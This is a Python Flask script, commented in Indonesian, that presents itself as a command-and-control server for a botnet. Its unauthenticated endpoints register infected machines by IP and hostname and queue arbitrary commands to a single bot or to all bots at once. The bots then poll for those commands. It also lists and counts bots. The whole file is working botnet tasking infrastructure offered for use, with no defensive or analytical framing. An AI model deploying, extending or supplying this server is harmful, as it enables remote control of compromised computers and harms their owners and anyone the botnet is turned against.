#!/usr/bin/env python3
# C2 SERVER - Command & Control untuk Botnet
from flask import Flask, request, jsonify
from flask_cors import CORS
import json
import time
from datetime import datetime

app = Flask(__name__)
CORS(app)

# Database sederhana
bots = {}
commands = {}

@app.route('/register', methods=['POST'])
def register_bot():
    """Register bot baru"""
    data = request.json
    bot_id = data.get('bot_id')
    bots[bot_id] = {
        "ip": data.get('ip'),
        "hostname": data.get('hostname'),
        "registered_at": str(datetime.now()),
        "last_seen": str(datetime.now())
    }
    print(f"✅ Bot registered: {bot_id}")
    return jsonify({"status": "ok"}), 200

@app.route('/get_command/<bot_id>', methods=['GET'])
def get_command(bot_id):
    """Ambil command untuk bot"""
    if bot_id in commands and commands[bot_id]:
        command = commands[bot_id].pop(0)
        return jsonify({"command": command}), 200
    return jsonify({}), 204

@app.route('/send_command', methods=['POST'])
def send_command():
    """Kirim command ke bot"""
    data = request.json
    bot_id = data.get('bot_id')
    command = data.get('command')
    
    if bot_id == "all":
        # Kirim ke semua bot
        for bid in bots:
            if bid not in commands:
                commands[bid] = []
            commands[bid].append(command)
        return jsonify({"status": f"Command sent to {len(bots)} bots"}), 200
    else:
        if bot_id not in commands:
            commands[bot_id] = []
        commands[bot_id].append(command)
        return jsonify({"status": f"Command sent to {bot_id}"}), 200

@app.route('/list_bots', methods=['GET'])
def list_bots():
    """Lihat semua bot"""
    return jsonify({"bots": bots}), 200

@app.route('/stats', methods=['GET'])
def stats():
    """Statistik botnet"""
    return jsonify({
        "total_bots": len(bots),
        "bots": list(bots.keys())
    }), 200

if __name__ == "__main__":
    print("🚀 C2 Server started on port 5000")
    print("📍 API Endpoints:")
    print("   POST /register - Register bot")
    print("   GET /get_command/<bot_id> - Get command")
    print("   POST /send_command - Send command")
    print("   GET /list_bots - List all bots")
    app.run(host='0.0.0.0', port=5000, debug=False)
